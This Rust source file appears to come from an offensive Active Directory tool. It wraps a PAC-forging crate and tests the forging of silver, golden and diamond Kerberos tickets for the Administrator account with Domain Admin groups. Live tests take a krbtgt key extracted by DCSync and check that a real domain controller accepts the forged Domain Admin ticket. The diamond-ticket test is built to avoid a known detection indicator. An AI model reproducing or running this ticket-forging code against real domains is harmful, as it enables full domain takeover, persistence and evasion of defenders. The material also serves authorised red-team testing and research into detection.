//! PAC (MS-PAC) marshaling adapter — the bulk of this module lives in the
//! standalone `ms-pac-forge` crate; here we just re-export it and layer the
//! adhammer-specific [`decrypt_ticket_pac`] on top of picky-krb's [`Tgt`].
//!
//! Everything in [`ms_pac_forge::pac`] (`ForgeIdentity`, `assemble_pac`,
//! `parse_pac`, `PAC_*` constants, `PacBuf`, `ParsedPac`, `extract_pac`,
//! `decrypt_ticket_pac_aes256`, `decrypt_ticket_pac_rc4`, `build_*`) is
//! re-exported as `crate::pac::*` so no downstream import has to change.

pub use ms_pac_forge::pac::{
    assemble_pac, buf_name, build_attributes, build_client_info, build_kerb_validation_info,
    build_requestor, decrypt_ticket_pac_aes256, decrypt_ticket_pac_rc4, extract_pac, parse_pac,
    ForgeIdentity, PacBuf, ParsedPac, PAC_ATTRIBUTES_INFO, PAC_CLIENT_INFO_TYPE, PAC_KDC_CHECKSUM,
    PAC_LOGON_INFO, PAC_REQUESTOR, PAC_SERVER_CHECKSUM, PAC_TICKET_CHECKSUM,
};

use crate::Tgt;
use anyhow::Result;
use picky_krb::data_types::EncTicketPart;

/// Decrypt a real TGT's EncTicketPart with the krbtgt AES256 key and return
/// (the parsed enc-ticket-part, the raw PAC bytes). Doubles as a live proof that
/// the DCSync-extracted krbtgt key is correct: AES decryption is
/// integrity-protected, so a wrong key fails here rather than yielding garbage.
///
/// Thin adapter over [`ms_pac_forge::pac::decrypt_ticket_pac_aes256`] that pulls
/// the ciphertext out of the local `Tgt` wrapper (which owns the picky-krb
/// `Ticket` and never crossed the ms-pac-forge boundary).
pub fn decrypt_ticket_pac(tgt: &Tgt, krbtgt_aes256: &[u8]) -> Result<(EncTicketPart, Vec<u8>)> {
    decrypt_ticket_pac_aes256(tgt.ticket_cipher(), krbtgt_aes256)
}

#[cfg(test)]
mod wired {
    //! Proves the re-export wires the ms-pac-forge assemble/parse/decrypt path
    //! into the local silver + rc4 golden forges. The exhaustive PAC shape
    //! tests live in ms-pac-forge itself.

    use super::*;

    fn sample() -> ForgeIdentity {
        ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519],
            domain_subauths: vec![21, 1111111111, 2222222222, 3333333333],
            logon_server: "DC01".into(),
            logon_domain: "CORP".into(),
            extra_sids: vec![],
        }
    }

    /// End-to-end wire proof: forge a silver ticket via the local `forge_silver_tgt`
    /// (which orchestrates on top of `ms_pac_forge::pac::assemble_pac` via the
    /// re-export), then decrypt it via the re-exported `decrypt_ticket_pac`
    /// adapter and parse the PAC via the re-exported `parse_pac`.
    #[test]
    fn silver_ticket_roundtrips_via_ms_pac_forge() {
        let key = [0x37u8; 32];
        let tgt =
            crate::forge_silver_tgt(&sample(), "CORP.LOCAL", &key, "cifs/dc01.corp.local", false)
                .unwrap();
        let (_etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt silver");
        let parsed = parse_pac(&pac).unwrap();
        let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
        assert_eq!(u32::from_le_bytes(li[120..124].try_into().unwrap()), 500);
        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
        assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
        assert!(parsed.get(PAC_ATTRIBUTES_INFO).is_some());
        assert!(parsed.get(PAC_REQUESTOR).is_some());
    }

    /// RC4 golden wire proof: forge under an NT-hash krbtgt key using the
    /// re-exported RC4 signature path (KERB_CHECKSUM_HMAC_MD5 = -138), then
    /// decrypt the ticket via the re-exported `decrypt_ticket_pac_rc4` and
    /// confirm the SERVER_CHECKSUM is an HMAC-MD5.
    #[test]
    fn rc4_golden_roundtrips_via_ms_pac_forge() {
        let nt = crate::rc4::nt_hash("Krbtgt-NT-Hash!");
        let tgt = crate::forge_golden_tgt(&sample(), "CORP.LOCAL", &nt, true).unwrap();
        let (_etp, pac) = decrypt_ticket_pac_rc4(tgt.ticket_cipher(), &nt).expect("rc4 decrypt");
        let parsed = parse_pac(&pac).unwrap();
        let srv = parsed.get(PAC_SERVER_CHECKSUM).unwrap();
        // SignatureType -138 (HMAC-MD5), 16-byte signature.
        assert_eq!(
            i32::from_le_bytes(srv.data[0..4].try_into().unwrap()),
            crate::rc4::SIG_HMAC_MD5
        );
        assert_eq!(srv.data.len(), 4 + 16);
    }

    /// **1.4.8-A WS-DIAMOND-TICKET roundtrip:** forge a Golden ticket first (which
    /// stands in for the legitimate KDC-issued TGT the diamond needs as a template),
    /// then hand it to `forge_diamond_tgt` with a DIFFERENT injected identity, and
    /// confirm the diamond ticket:
    /// - decrypts under the same krbtgt key, and
    /// - carries the *injected* identity's PAC (rid, groups) rather than the
    ///   template's, and
    /// - inherits the template's timestamps (auth_time / endtime / renew_till)
    ///   exactly, byte-for-byte.
    /// The last property is what makes the ticket "diamond" — its clock domain
    /// matches the KDC's real clock, not `far_future_time()`.
    #[test]
    fn diamond_ticket_inherits_timestamps_and_overrides_pac() {
        let key = [0x42u8; 32];

        // Template = a Golden with template identity (RID 1105, no admin groups).
        let template_id = ForgeIdentity {
            user: "labuser".into(),
            rid: 1105,
            primary_gid: 513,
            group_rids: vec![513],
            domain_subauths: vec![21, 1, 2, 3],
            logon_server: "DC01".into(),
            logon_domain: "CORP".into(),
            extra_sids: vec![],
        };
        let template = crate::forge_golden_tgt(&template_id, "CORP.LOCAL", &key, false)
            .expect("forge template TGT");

        // Read template's timestamps for the equality assertion below.
        let (etp_template, _) =
            decrypt_ticket_pac(&template, &key).expect("decrypt template with krbtgt key");
        let template_auth_time = etp_template.auth_time.0.clone();
        let template_endtime = etp_template.endtime.0.clone();

        // Diamond overrides = elevated identity (Administrator RID 500 + admin groups).
        let injected = ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519],
            domain_subauths: vec![21, 1, 2, 3],
            logon_server: "DC01".into(),
            logon_domain: "CORP".into(),
            extra_sids: vec![],
        };
        let diamond =
            crate::forge_diamond_tgt(&template, &injected, &key, false).expect("forge diamond");

        // Diamond decrypts under same krbtgt key.
        let (etp_diamond, pac_diamond) =
            decrypt_ticket_pac(&diamond, &key).expect("decrypt diamond with krbtgt key");

        // Timestamps inherited from template — this is the diamond property.
        assert_eq!(
            etp_diamond.auth_time.0, template_auth_time,
            "diamond auth_time must equal template auth_time (inherited)"
        );
        assert_eq!(
            etp_diamond.endtime.0, template_endtime,
            "diamond endtime must equal template endtime (inherited — no 10-year IOC)"
        );

        // Injected PAC identity replaces the template's.
        let parsed = parse_pac(&pac_diamond).unwrap();
        let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
        // RID at offset 120 in KERB_VALIDATION_INFO (LE u32).
        let rid_in_pac = u32::from_le_bytes(li[120..124].try_into().unwrap());
        assert_eq!(
            rid_in_pac, 500,
            "diamond PAC RID must be the injected 500, not template 1105"
        );
        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
        assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
        assert!(parsed.get(PAC_REQUESTOR).is_some());
    }

    /// Sanity that the re-exported constants keep their MS-PAC-mandated values.
    #[test]
    fn pac_type_constants_match_ms_pac() {
        assert_eq!(PAC_LOGON_INFO, 1);
        assert_eq!(PAC_SERVER_CHECKSUM, 6);
        assert_eq!(PAC_KDC_CHECKSUM, 7);
        assert_eq!(PAC_CLIENT_INFO_TYPE, 10);
        assert_eq!(PAC_TICKET_CHECKSUM, 16);
        assert_eq!(PAC_ATTRIBUTES_INFO, 17);
        assert_eq!(PAC_REQUESTOR, 18);
    }
}

#[cfg(test)]
mod live {
    use super::*;

    /// Live oracle: get recon's real TGT, decrypt its EncTicketPart with the DCSync-extracted
    /// krbtgt AES256 key, and dump the PAC buffer layout. Proves the krbtgt key AND captures the
    /// authoritative Server 2025 PAC shape for the forger.
    /// Env: ADH_KDC, ADH_REALM, ADH_KRBTGT_AES256 (64 hex), ADH_USER/ADH_PASS.
    #[tokio::test]
    #[ignore = "live DC"]
    async fn decrypt_real_pac() {
        let Ok(kdc) = std::env::var("ADH_KDC") else {
            return;
        };
        let realm = std::env::var("ADH_REALM").unwrap_or_else(|_| "CORP.LOCAL".into());
        let user = std::env::var("ADH_USER").unwrap_or_else(|_| "lowpriv".into());
        let pass = std::env::var("ADH_PASS").unwrap_or_default();
        let key = hex::decode(std::env::var("ADH_KRBTGT_AES256").expect("ADH_KRBTGT_AES256"))
            .expect("hex");

        let tgt = crate::get_tgt(&user, &pass, &realm, &kdc)
            .await
            .expect("get_tgt");
        let (etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt PAC");
        let parsed = parse_pac(&pac).expect("parse PAC");
        eprintln!(
            "[pac] {} bytes, flags={:02x?}, {} buffers:",
            pac.len(),
            etp.flags.0.as_bytes(),
            parsed.buffers.len()
        );
        for b in &parsed.buffers {
            eprintln!(
                "  type={:2} {:32} {} bytes  {}",
                b.ul_type,
                buf_name(b.ul_type),
                b.data.len(),
                hex::encode(&b.data[..b.data.len().min(48)])
            );
        }
        if std::env::var("ADH_DUMP_LOGON").is_ok() {
            let li = parsed.get(PAC_LOGON_INFO).unwrap();
            eprintln!("[logon_info_full] {}", hex::encode(&li.data));
        }
        assert!(parsed.get(PAC_LOGON_INFO).is_some());
        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
        assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
    }

    /// Forge a Domain-Admin golden ticket with the DCSync-extracted krbtgt AES256 key and PROVE
    /// the KDC accepts it: submit the forged TGT in a TGS-REQ (PA-TGS-REQ), which forces the KDC
    /// to decrypt the ticket and validate the PAC's KDC signature under full KB5020805 enforcement.
    /// A TGS-REP back = the golden ticket (marshaling + both signatures + requestor) is valid.
    /// Env: ADH_KDC, ADH_REALM, ADH_KRBTGT_AES256, ADH_DOMAIN_SID (S-1-5-21-a-b-c), ADH_SPN.
    #[tokio::test]
    #[ignore = "live DC"]
    async fn golden_ticket_accepted() {
        let Ok(kdc) = std::env::var("ADH_KDC") else {
            return;
        };
        let realm = std::env::var("ADH_REALM").unwrap_or_else(|_| "CORP.LOCAL".into());
        let key = hex::decode(std::env::var("ADH_KRBTGT_AES256").expect("ADH_KRBTGT_AES256"))
            .expect("hex");
        let dsid = std::env::var("ADH_DOMAIN_SID").expect("ADH_DOMAIN_SID");
        let subs: Vec<u32> = dsid
            .trim_start_matches("S-1-5-")
            .split('-')
            .map(|x| x.parse().unwrap())
            .collect();
        let spn = std::env::var("ADH_SPN")
            .unwrap_or_else(|_| format!("cifs/dc01.{}", realm.to_lowercase()));

        let id = ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519],
            domain_subauths: subs,
            logon_server: "DC01".into(),
            logon_domain: realm.split('.').next().unwrap_or("CORP").to_uppercase(),
            extra_sids: vec![],
        };
        let tgt = crate::forge_golden_tgt(&id, &realm, &key, false).expect("forge golden");
        let hash = crate::roast_spn(&tgt, "Administrator", &spn, &kdc)
            .await
            .expect("KDC must accept the golden ticket (TGS-REP for the SPN)");
        eprintln!("[golden] KDC accepted forged DA TGT → service ticket for {spn}");
        assert!(hash.contains("$krb5tgs$") || !hash.is_empty());
    }
}
